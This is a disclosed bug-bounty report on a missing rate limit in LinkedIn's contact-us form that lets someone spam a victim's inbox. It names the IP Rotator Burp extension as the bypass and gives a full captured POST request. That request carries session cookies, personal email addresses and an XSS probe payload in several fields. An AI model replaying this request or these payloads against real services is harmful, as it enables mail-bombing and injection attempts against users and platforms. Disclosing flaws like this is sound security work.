# Rate limit Bypass on contact-us through IP Rotator (burp extension)(https://www.linkedin.com/help/linkedin/solve/contact)

## Report Details
- **Report ID**: 1578121
- **URL**: https://hackerone.com/reports/1578121
- **State**: Closed
- **Severity**: N/A
- **Submitted**: 2022-05-22T09:04:00.642Z
- **Disclosed**: 2022-06-15T21:10:06.862Z

## Reporter
- **Username**: sachinrajput
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: linkedin

## Vulnerability Information
hello Team
i have found issue on https://www.linkedin.com/help/linkedin/solve/contact , which spam the mail box of victim (through alternative email) and support team.
Steps 
1. Go to https://www.linkedin.com/help/linkedin/solve/contact
2. Fill the Form
3. Fill the victim mail id in alternative email.
4.Start IP Rotatorr (Burp Extension) for bypass the rate-limit.
    ( https://portswigger.net/bappstore/2eb2b1cb1cf34cc79cda36f0f9019874)
5. Capture the request.

HTTP REQUEST

POST /help/linkedin/api/ticket/new?page_key=hc_smarter_assist&lipi=urn%3Ali%3Apage%3Ahc_solve%3BHaCrDTZIQGaymuZQSvEoTw%3D%3D HTTP/2
Host: www.linkedin.com
Cookie: bcookie="v=2&c4f317bf-bed0-495f-8496-d1b53544d1c4"; bscookie="v=1&202110081507174a83b87c-0d5d-4b78-8691-e7eb51b819d6AQHmFhjM3oKhpmPl-g67WgT5UkwJSxda"; li_rm=AQEFn2UeyuLk9wAAAYDcvJnTHb73kYJw6UFmfLlXFBMGZSWGplNujPE6Hh3Wpm1tONATBA15Byos33xXv5lHPUrD9baf3W4G7WlsX-FN2vLE0eRRseNYAP_8tTgZ18CPQ-FdTr3mNwiMyo1P3eARQQma20XvGaJIEF8F79LkaZIYXk-BUp0VhWzMUYamzn-8lIY61pl65qMbgIrwMLtQfKYyM7pQ_z5k9GlPo_bwy2Uy24QnKXRw71ideBf7WuMTPpXpLaBG9LGZM3ZY8oZtvlL_ZZ5-JrbGFVJUELYBjd5LcExjjb18eZzw47QUczhvnGxzzeDg2B0NsIyc-_g; g_state={"i_l":3,"i_p":1653575596396}; G_ENABLED_IDPS=google; timezone=Asia/Kolkata; li_theme=light; li_theme_set=app; li_mc=MTswOzE2NTMyMDc5MzA7MTswMjEF8QNpG1iJaJfCqv0+88KjLXLqdlvBLjPuxCZuAQOYOg==; li_alerts=e30=; visit=v=1&M; li_gc=MTswOzE2NTI5NzA3ODk7MjswMjFkSg/yf65s1QypezQZsH0W9ajBD2B0DVWIY9G2hIILOw==; JSESSIONID="ajax:1140114095873524025"; UserMatchHistory=AQKj5fR0mR7oJQAAAYDqurzF6lb9b8uswj6Z5l6vZllwjzWMK2a0-LI760kRMfhuXJAqDBgXGgbTOGGkNPmFYG8G0KQgxX45NsoDiOk_XrskWULZok5h3FmANIjbdieFC-Wu7lAykeAaK4iS6eSxL7GsfGmA6Er6S5PgUNQjZ0pnwcDZyPx_CJAX3LAO9YlnUTcscJ6P7SLjXeCv4zxPLIJDdd1kot10ma8qA7khVUNMXqX0sVi3sJ84bi4flAZWB4t5g56qmQ; cap_session_id=4016886046:1; li_er=v=1&r=urn:li:contract:396850646&t=1651318702036&g=MDIxwMB8HbZ4pkHlcKjmNWVgXQU708vn4ctzjdu9DLdCVAs=; u_tz=GMT+05:30; li_at=AQEDATumkO8By_toAAABgN_E99QAAAGBA9F71E4Ap4xA8olRhCz_2fWkh9V9Yg0_YpIU3E8M2YK7TKMxvwV4LlWFinQebObeHNvAJa_iwPamoe9BfcdWl8cjr7WSls0XAMBG9DjMi7Itzt4OkQHpgNzo; liap=true; li_a=AQJ2PTEmY2FwX3NlYXQ9Mjc2Mzg3MDE2JmNhcF9hZG1pbj1mYWxzZSZjYXBfa249Mzk2ODUwNjQ2SCsATU1i0kEIAdqllopHZmTEvrk; lidc="b=TB23:s=T:r=T:a=T:p=T:g=3826:u=2:x=1:i=1653195903:t=1653282303:v=2:sig=AQGCZy6T9vR93sKtbfJliGAugit-RF6R"; lang=v=2&lang=en-US; sdsc=1%3A1SZM1shxDNbLt36wZwCgPgvN58iw%3D; PLAY_SESSION=eyJhbGciOiJIUzI1NiJ9.eyJkYXRhIjp7InNlc3Npb25faWQiOiI3YmZkZDdjNS0yZDgyLTQzN2ItOGIwZS0yNjFiNDU5ZWZhYTV8MTY1MzIwNzUxNiIsImFsbG93bGlzdCI6Int9IiwicmVjZW50bHktc2VhcmNoZWQiOiIiLCJyZWZlcnJhbC11cmwiOiJodHRwczovL3d3dy5saW5rZWRpbi5jb20vIiwiYWlkIjoiIiwiUk5ULWlkIjoifDAiLCJyZWNlbnRseS12aWV3ZWQiOiI1MDE5MSIsIkNQVC1pZCI6IsKeXHQnX8OXUMOgXHLDn1bCvcKMw6vDrCxMIiwiZXhwZXJpZW5jZSI6InNtYXJ0IGFzc2lzdCIsImlzX25hdGl2ZSI6ImZhbHNlIiwidHJrIjoicHNldHRpbmdzLWRhdGEtZXhwb3J0X2FwaSJ9LCJuYmYiOjE2NTMyMDgwMjUsImlhdCI6MTY1MzIwODAyNX0.JgW5QI-j18ogKdtRln0yz2kaXUA_LyQ6cUhk4TH2-nQ; PLAY_LANG=en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:100.0) Gecko/20100101 Firefox/100.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Csrf-Token: ajax:1140114095873524025
Content-Length: 749
Origin: https://www.linkedin.com
Referer: https://www.linkedin.com/help/linkedin/solve/contact
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers
Connection: close

suppliedname=Rahul+kumar&email=hiiamsachinkumar%40gmail.com&altemail=kumarsachin1642001%40gmail.com&c%24customer_classification=732&c%24app=2060&c%24platform=1371&description=%22%3E%3Cscript%3Ealert(%221%22)%3C%2Fscript%3E&attachments=%5B%5D&first_name=Rahul&last_name=kumar&user_message=Email%3A+%3A+hiiamsachinkumar%40gmail.com%3Cbr%3E%3Cbr%3EAlternate+Email%3A+%3A+kumarsachin1642001%40gmail.com%3Cbr%3E%3Cbr%3EIssue+Type+%3A+Inbox%2FInvitations%2FMessages%3Cbr%3E%3Cbr%3EIn+Which+App+or+Site%3F+%3A+LinkedIn+(Mobile+App)%3Cbr%3E%3Cbr%3EOn+What+Device%3F+%3A+iPad%3Cbr%3E%3Cbr%3EYour+Question+%3A+%22%3E%3Cscript%3Ealert(%221%22)%3C%2Fscript%3E&name=Submit+Your+Question&path=LI-DEFAULT-NEW&subject=%22%3E%3Cscript%3Ealert(%221%22)%3C%2Fscript%3E 

DONE

## Impact

No Rate Limit On Contact Us
Attacker can spam the victim Gmail by using alternative email endpoint.

## Attachments
- no-rate_limit_on_contact-us_--1.png
- victim_gmail.png
